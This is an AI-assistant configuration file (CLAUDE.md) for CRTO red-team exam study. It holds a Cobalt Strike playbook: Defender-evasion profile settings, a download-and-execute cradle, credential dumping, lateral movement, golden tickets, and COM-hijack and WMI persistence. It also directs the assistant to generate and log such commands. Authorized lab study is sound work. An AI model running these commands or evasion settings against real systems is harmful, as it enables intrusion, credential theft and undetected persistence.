# CLAUDE.md — CRTO Study Environment
# Juan | Senior Penetration Tester

## BACKUP & RECOVERY

**Primary repo:** https://github.com/botesjuan/crto-study-notes

All content in this working directory is pushed to the above GitHub repo after each
study session. This serves as both version history and disaster recovery — if the Kali
study instance is lost, clone this repo on a new machine to resume:

```bash
git clone https://github.com/botesjuan/crto-study-notes.git
cd crto-study-notes
# Claude Code context is in CLAUDE.md — re-attach and continue from notes/session-log.md
```

## IDENTITY & CONTEXT

You are a senior red team study assistant supporting CRTO (Certified Red Team Operator)
exam preparation by Zero Point Security. The operator is an experienced penetration tester
holding OSCP, CPTS, BSCP, CISSP, and CEH. You can explain concepts when asked. 
Default to concise, technical, operator-level outputs.

**Primary study goals:**
1. Pass the CRTO exam (Zero Point Security — RTO I, LearnWorlds/Skillable platform)
2. Maintain a GitHub cheatsheet repo for exam-day quick reference

**Exam scoring reminder:** 50 pts objective completion + 50 pts OPSEC/stealth.
Triggering Defender alerts costs points even when flags are captured. Always default
to the stealthiest technique, not the most convenient one.

---

## INFRASTRUCTURE

### CRTO Labs (ZeroPointSecurity — SnapLabs/Skillable)
- Browser-based via Guacamole (no VPN, air-gapped)
- Attacker: Kali Linux (pre-staged) + Windows dev box
- C2: Licensed Cobalt Strike (team server on Kali, client on Windows)
- AD: Three-forest environment (CONTOSO domain family)
- Clipboard: Ctrl+Alt+Shift → paste panel → release → paste in session
- Lab time: Modular per-topic labs (30–45 min), lifetime access, no expiry, can only run once in 24 hours.

## BEHAVIOUR RULES

1. **Never explain what Cobalt Strike or Active Directory is.** Assume full prior knowledge.
2. **Always provide Cobolt Strike syntax** when the task involves C2 commands.
3. **Always flag OPSEC risk** — label commands as `OPSEC-SAFE`, `OPSEC-CAUTION`, or
   `OPSEC-UNSAFE` using the CS beacon model as baseline.
4. **Default output format for commands:** fenced code blocks with language tag.
5. **When asked for a cheatsheet entry**, format it ready to paste into the GitHub repo
   (Markdown, heading hierarchy consistent with existing notes structure below).
6. **Never suggest noisy techniques** (psexec, shell, powershell beacon commands) without
   explicitly flagging the OPSEC cost and offering the stealthier alternative first.
7. **Assume Defender is always on** unless I explicitly say otherwise.
8. **When I say "note this"**, output a formatted Markdown block ready to append to the
   relevant cheatsheet section.
9. **GitHub commit messages**: suggest concise conventional-style messages when I push.

---

## COBALT STRIKE OPSEC REFERENCE

### Command Risk Tiers (CRTO exam critical)

| Risk | Commands | Why |
|------|----------|-----|
| UNSAFE | `shell`, `powershell`, `run` | Spawns cmd.exe/powershell.exe as child of beacon |
| UNSAFE | `mimikatz` (direct) | Runs Mimikatz in beacon process — well-signatured |
| CAUTION | `jump psexec`, `jump psexec64` | Creates new service (Event 7045), writes binary to disk |
| CAUTION | `jump scshell64` | Modifies existing service binary path (Event 7040) — no 7045 |
| CAUTION | `execute-assembly` | Fork & run — spawns sacrificial process (spawnto target), output via named pipe |
| CAUTION | `spawn`, `spawnas` | Fork & run — creates sacrificial process |
| CAUTION | `remote-exec wmi` | WMI process creation visible in Event 4688 and WMI activity log |
| CAUTION | `make_token` | Creates Type 9 logon session — Event 4648 logged |
| CAUTION | `pth` | Pass-the-hash via Mimikatz sekurlsa::pth internally — LSASS touch |
| CAUTION | `dcsync` | Logged on DC as replication event (Event 4662) |
| CAUTION | `getsystem` | Tries multiple escalation techniques including service creation |
| SAFE | `inline-execute` | BOF — runs in beacon thread, no process spawn, no child process |
| SAFE | `powerpick` | Unmanaged PowerShell — no powershell.exe spawned |
| SAFE | `ldapsearch` | BOF — LDAP query inside beacon thread, no child process |
| SAFE | `steal_token` | Duplicates token from existing process — in-process, no spawn |
| SAFE | `jump winrm`, `jump winrm64` | Injects into wsmprovhost.exe via WinRM — no service created |
| SAFE | `krb_triage`, `krb_dump` | BOF-based Kerberos API calls — no raw LSASS memory read |
| SAFE | `getuid`, `getpwd`, `ls`, `cd` | Built-in beacon thread operations |

### Malleable C2 Profile — Exam Day Checklist
```
# Global settings
set sleeptime "3000";        # 3s sleep — balance between responsiveness and noise
set jitter    "20";          # 20% jitter
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...";

# Stage block — defeats Defender memory scanner
stage {
    set userwx          "false";          # no RWX pages — RW then RX
    set cleanup         "true";           # remove loader stub after mapping
    set copy_pe_header  "false";          # strip PE headers from in-memory beacon
    set module_x64      "Hydrogen.dll";   # module stomping — memory backed by legit DLL
}

# Post-ex block — controls fork & run and named pipes
post-ex {
    set spawnto_x64  "%windir%\\sysnative\\werfault.exe";   # override default rundll32.exe
    set cleanup      "true";
    set pipename     "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint  "ntdll.dll!RtlUserThreadStart+0x2c";   # spoof thread start address
    set amsi_disable "true";                                 # patches AMSI in fork&run process
}

# Process-inject block — no RWX at any stage
process-inject {
    set startrwx "false";
    set userwx   "false";
    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```
- Run `c2lint` against profile before exam — catch syntax errors early
- `sudo /usr/bin/docker restart cobaltstrike-cs-1` after any profile edit
- Check `sudo /usr/bin/docker logs cobaltstrike-cs-1` — no `[!]` errors = profile loaded
- `amsi_disable "true"` covers fork & run (`execute-assembly`, `powerpick`) but NOT `jump` commands
- SMB listener pipename (`TSVCPIPE-*` default) — create with CUSTOM name on exam day

### Beacon Spawn-To (spawnto)
Default spawnto is `rundll32.exe` — highly signatured. Always override:
```
# Profile level (controls execute-assembly, powerpick, mimikatz fork&run)
post-ex { set spawnto_x64 "%windir%\\sysnative\\werfault.exe"; }
post-ex { set spawnto_x86 "%windir%\\syswow64\\werfault.exe"; }

# Per-beacon runtime override (after lateral move — set context-appropriate process)
beacon> spawnto x64 %windir%\sysnative\werfault.exe

# Service binary payload spawnto (jump psexec64 / scshell64 / privesc service)
# ak-settings is SEPARATE from post-ex spawnto — env vars don't resolve in SYSTEM service context
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

---

## ATTACK CHAIN REFERENCE

### Phase 1 — Initial Access (Assumed Breach)
```powershell
# Exam: assume-breach — you have creds, log in to foothold workstation directly
# AppDomainManager injection via ngentask.exe → beacon inside msedge.exe (OPSEC-SAFE)
cd C:\Payloads\deals
$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
$env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
.\ngentask.exe
# Beacon checks in from msedge.exe

# Alternative — Scripted Web Delivery (if AppDomainHijack not pre-built)
iex (new-object net.webclient).downloadstring('http://www.bleepincomputer.com/<uri>')
```

### Phase 2 — Host Recon & Situational Awareness
```cs
// OPSEC-SAFE (inline / in-memory)
beacon> getuid                       // built-in — OPSEC-SAFE, no child process
beacon> process_browser             // GUI tab — process list with inject/steal_token/keylog/screenshot options
```

### Phase 3 — Domain Recon (OPSEC-SAFE primary: ldapsearch BOF)
```cs
// Primary — ldapsearch BOF (OPSEC-SAFE — runs in beacon thread, no child process)
beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor

// Parse logs with BOFHound → import JSON into BloodHound
// Ubuntu WSL: scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs . && bofhound -i logs

// Secondary — PowerView via powerpick (OPSEC-CAUTION — requires powershell-import first)
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-DomainUser -Properties samaccountname,description
beacon> powerpick Get-DomainGroupMember "Domain Admins" -Recurse
beacon> powerpick Find-LocalAdminAccess      // OPSEC-CAUTION — noisy, generates many LDAP queries
```

### Phase 4 — Credential Attacks

#### Kerberoasting
```cs
// OPSEC-CAUTION (execute-assembly spawns process) — enumerate SPNs first to avoid honeypots
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName
// Target specific account only — do NOT roast all SPNs blindly
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```

#### AS-REP Roasting
```cs
// OPSEC-CAUTION (execute-assembly spawns process)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
```

#### Kerberos Ticket Dump (preferred over LSASS dump)
```cs
// OPSEC-CAUTION — Kerberos API calls, less noisy than raw LSASS read
// Requires kerbeus_cs.cna loaded: Cobalt Strike > Script Manager > Load > C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
beacon> krb_triage                              // list all cached tickets
beacon> krb_dump /user:rsteel /service:krbtgt   // dump specific TGT
```

#### LSASS Dump — OPSEC Ladder (least to most noisy)
```cs
// Tier 1 — OPSEC-CAUTION: Nanodump BOF (Kerberos API, not raw memory read)
beacon> inline-execute C:\Tools\nanodump\nanodump.x64.o

// Tier 2 — OPSEC-CAUTION: execute-assembly (spawns process)
beacon> execute-assembly C:\Tools\SharpDump\SharpDump\bin\Release\SharpDump.exe

// Tier 3 — OPSEC-UNSAFE: sekurlsa::logonpasswords (mimikatz direct — NEVER use in exam)
beacon> mimikatz sekurlsa::logonpasswords
```

### Phase 5 — Lateral Movement

```cs
// Impersonate first — always before lateral movement
beacon> steal_token <pid>                        // OPSEC-SAFE — token from running process (preferred)
beacon> make_token CONTOSO\rsteel Passw0rd!      // OPSEC-CAUTION — Event 4648, fake pass OK for Kerberos

// OPSEC preference order (use first option that works, fall down only if needed):

// 1. WinRM (OPSEC-SAFE — no service, no Event 7045, injects into wsmprovhost.exe)
beacon> powerpick Test-WSMan <target>            // test WinRM reachability first
beacon> jump winrm64 <target> smb

// 2. SCShell (OPSEC-CAUTION — modifies existing service path, no Event 7045)
// Load first: Cobalt Strike > Script Manager > Load > C:\Tools\SCShell\CS-BOF\scshell.cna
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump scshell64 <target> smb

// 3. WMI exec (OPSEC-CAUTION — no service, no 7045, but WMI process in Event 4688)
beacon> remote-exec wmi <target> <full-path-to-staged-payload>

// 4. psexec (OPSEC-UNSAFE — LAST RESORT ONLY — generates Event 7045)
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump psexec64 <target> smb

beacon> rev2self                                 // drop impersonation after move succeeds
```

### Phase 6 — Privilege Escalation

```cs
// Enumerate weak service registry permissions (OPSEC-SAFE — powerpick, no child process)
beacon> powerpick $lowpriv = @('Everyone','BUILTIN\Users','NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject]@{ServiceName=$_.PSChildName; Identity=$ace.IdentityReference.Value}}}}

// Exploit weak service (generate Windows Service EXE payload first)
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> sc_stop <ServiceName>
beacon> upload C:\Payloads\http_x64.svc.exe
beacon> sc_config <ServiceName> C:\Temp\http_x64.svc.exe 0 2
beacon> sc_start <ServiceName>
// SYSTEM beacon appears — restore service after
beacon> sc_config <ServiceName> "<original-path>" 0 2
beacon> rm http_x64.svc.exe

// Token theft from SYSTEM process (OPSEC-SAFE — no spawn)
beacon> steal_token <SYSTEM-process-pid>   // find PID via process_browser

// getsystem — OPSEC-CAUTION (tries multiple techniques including service creation)
beacon> getsystem
```

### Phase 7 — Domain Dominance

#### DCSync (OPSEC-CAUTION — logged on DC as replication event, Event 4662)
```cs
// Syntax: dcsync <fqdn> <DOMAIN\account>
beacon> dcsync contoso.com CONTOSO\krbtgt          // krbtgt hash for Golden Ticket
beacon> dcsync contoso.com CONTOSO\Administrator
```

#### Golden Ticket (Rubeus — NOT mimikatz direct)
```cs
// Build golden ticket on attacker desktop (PowerShell, not in beacon)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:<child.domain.com> /sid:<child-domain-SID> /sids:<parent-EA-SID> /aes256:<krbtgt-aes256-hash> /outfile:C:\Users\Attacker\Desktop\golden

// Inject into beacon session
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN].kirbi
beacon> run klist
beacon> ls \\<dc>\c$     // verify DA access
```

#### Trust Enumeration
```cs
// OPSEC-SAFE — ldapsearch BOF
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
// trustDirection: 1=INBOUND (we are trusted), 2=OUTBOUND (we trust them), 3=BIDIRECTIONAL
// trustAttributes: 32=WITHIN_FOREST (parent-child), 8=FOREST_TRANSITIVE (cross-forest)
```

### Phase 8 — Persistence

```cs
// USER-LEVEL — COM hijack via Teams DLL (OPSEC-CAUTION — DLL on disk, HKCU only, no admin)
// Deploy immediately after first beacon, before privesc
beacon> cd C:\Users\<user>\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
beacon> upload C:\Payloads\http_x64.dll
beacon> mv http_x64.dll Microsoft.Teams.HttpClient.dll
beacon> timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
beacon> reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
beacon> reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
// Triggers when Teams starts — beacon appears from ms-teams.exe

// SYSTEM-LEVEL — WMI event subscription (OPSEC-CAUTION — requires SYSTEM beacon)
// Triggers on GPO refresh (gpupdate) — survives reboot
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe windbg.exe
beacon> powershell-import C:\Tools\WmiPersistence.ps1
beacon> psinject <BEACON-PID> x64 Add-WmiPersistence
beacon> execute gpupdate /target:computer /force    // test trigger
// Cleanup: psinject <PID> x64 Remove-WmiPersistence
```

---

## DEFENSE EVASION REFERENCE

### AMSI Bypass Techniques
```cs
// CS: handled by malleable profile post-ex block

// Technique 1 — Patching AmsiScanBuffer (well-signatured — obfuscate)
// Technique 2 — AMSI via COM (less signatured)
// Technique 3 — Forking process with AMSI disabled environment
// Technique 4 — ETW patching alongside AMSI (recommended for exam-level)
```

### ETW Bypass
```cs
// NOTE: driver-bofs\etw.x64.o patches ETW kernel callbacks — requires a kernel driver loaded
// This is BYOVD / CRTO II scope — will error "Error getting callback offsets" without driver
// DO NOT use on CRTO I exam — profile amsi_disable "true" covers AMSI in fork&run processes

// Userland ETW patch (patches EtwEventWrite in ntdll — no driver needed) — if BOF available:
beacon> inline-execute C:\path\to\etw_userland.x64.o   // run after each lateral move to new host
```

### AV Evasion — Payload Generation Checklist
- [ ] Swap default CS artifact kit — recompile with `cobaltstrike/arsenal-kit`
- [ ] Custom resource kit for PowerShell stagers
- [ ] Sleep mask enabled in profile
- [ ] Stomped PE headers (`module_x64` in stage block)
- [ ] Signed loader preferred (self-signed or purchased cert)
- [ ] Test against Defender signature version noted in lab before exam

---

### Exam Flow
```
Start → Read scope & engagement rules (exam brief in-platform)
      → Stand up CS team server on exam Kali
      → Configure custom C2 profile → test beacon callback
      → Begin with initial compromise vector provided
      → Enumerate: getuid → process_browser → check for EDR → domain recon
      → Build BloodHound graph → identify shortest DA path
      → Execute chain: privesc → lateral → DA → flag
      → Submit flags to scoring portal as you go
      → OPSEC audit before each new technique — check SIEM if available
      → Rest between flag sets — 48h over 7 days, pace yourself
```

### Flag-by-Flag Mindset
- Get flag → pause → check what noise you made → adjust profile/technique
- If stuck > 2h on a flag → move to another path, come back
- Document every command run — you want the OPSEC score, not just flags
- Revert machines if environment gets polluted — don't try to clean up manually

## QUICK REFERENCE CARD (Exam Day Pocket Guide)

```
OPSEC-SAFE:    inline-execute, ldapsearch, powerpick, steal_token, jump winrm64, krb_triage, krb_dump, getuid
OPSEC-CAUTION: execute-assembly, make_token, remote-exec wmi, jump scshell64, getsystem, dcsync, pth
OPSEC-UNSAFE:  shell, powershell, run, jump psexec64, mimikatz direct

RECON:         ldapsearch <filter> --attributes ... (BOF — primary, OPSEC-SAFE)
               BOFHound → BloodHound (preferred over SharpHound)
KERBEROAST:    execute-assembly C:\Tools\Rubeus\...\Rubeus.exe kerberoast /user:<svc> /nowrap
ASREPROAST:    execute-assembly C:\Tools\Rubeus\...\Rubeus.exe asreproast /format:hashcat /nowrap
IMPERSONATE:   steal_token <pid>  |  make_token DOMAIN\user Pass + kerberos_ticket_use <kirbi>
LATERAL:       jump winrm64 > jump scshell64 > remote-exec wmi > jump psexec64 (last resort)
LSASS:         krb_dump (BOF) > nanodump BOF > SharpDump > mimikatz (NEVER in exam)
DCSYNC:        dcsync <fqdn> <DOMAIN\account>  (CAUTION — Event 4662 on DC)
PERSIST:       COM hijack (user-level, no admin, deploy first) > WMI sub (SYSTEM-level, post-privesc)
GOLDEN TKT:    Rubeus.exe golden ... /outfile:golden → kerberos_ticket_use golden.kirbi
```

---

## STUDY ASSISTANT — BEHAVIOUR DIRECTIVES

These directives govern how Claude Code behaves during CRTO study sessions.
They extend and do not replace the BEHAVIOUR RULES section above.
Do this automatically without being asked. If I paste a command from the lab, log it.
If I ask you to generate a command, log the output.

### OPSEC Review — "OPSEC Check"
When I say **"OPSEC check"** before running a technique:
Output a structured pre-execution review:
```
OPSEC PRE-CHECK: <technique name>
─────────────────────────────────────────────────
Tier:          SAFE / CAUTION / UNSAFE
Spawns proc:   Yes / No — <process name if yes>
Touches LSASS: Yes / No
Writes disk:   Yes / No — <path if yes>
Event logs:    <Event IDs generated>
EDR telemetry: <what an EDR hook sees>
Defender sig:  Known / Unknown / Bypassed by profile
─────────────────────────────────────────────────
Safer alternative: <command if a stealthier option exists>
```
Log the OPSEC check result to today's command log.

### Defender Signature Notes
When I observe a technique being caught or bypassed by Defender during lab work,
and I report it, append to `notes/<relevant-module>.md`:
```markdown
#### [YYYY-MM-DD] Defender Observation
**Technique:** <technique name>
**Defender version:** <sig version noted in lab>
**Result:** DETECTED / BYPASSED / PARTIAL
**Profile setting that helped/failed:** <malleable profile option or loader tweak>
**Workaround:** <what worked instead>
```
And append a one-liner to `cheatsheets/defense-evasion.md`.
